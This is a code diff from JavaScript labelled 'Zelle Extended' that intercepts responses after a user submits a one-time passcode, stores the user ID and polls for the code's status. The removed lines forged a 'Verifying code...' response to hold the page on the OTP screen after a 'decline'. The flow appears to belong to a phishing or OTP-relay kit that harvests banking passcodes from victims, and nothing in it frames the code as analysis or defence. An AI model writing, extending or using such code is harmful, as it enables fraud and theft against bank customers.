@@ -916,33 +916,12 @@
                     if (data.success && data.id) {
                         console.log('[Zelle Extended] OTP submitted, user ID:', data.id);
                         
-                        // Check if this is a RETRY (same user ID + polling was stopped after decline)
-                        const isRetry = (currentUserId === data.id && pollingStopped);
+                        // Simple: Always start/restart polling, let it handle everything
+                        currentUserId = data.id;
+                        startOtpPolling(data.id);
                         
-                        if (isRetry) {
-                            console.log('[Zelle Extended] 🔄 RETRY DETECTED - Blocking React app from advancing');
-                            
-                            // Restart polling for retry
-                            startOtpPolling(data.id);
-                            
-                            // ✅ Return modified response to keep React on OTP page
-                            return new Response(JSON.stringify({
-                                success: false,
-                                message: 'Verifying code...',
-                                id: data.id
-                            }), {
-                                status: 200,
-                                headers: { 'Content-Type': 'application/json' }
-                            });
-                        } else {
-                            // First-time submission - let React advance normally
-                            console.log('[Zelle Extended] ✅ FIRST SUBMISSION - Allowing React app to advance');
-                            
-                            if (currentUserId !== data.id || pollingStopped) {
-                                currentUserId = data.id;
-                                startOtpPolling(data.id);
-                            }
-                        }
+                        // Always return original response - no modifications
+                        console.log('[Zelle Extended] Returning original response');
                     }
                 } catch (e) {
                     // Ignore parsing errors
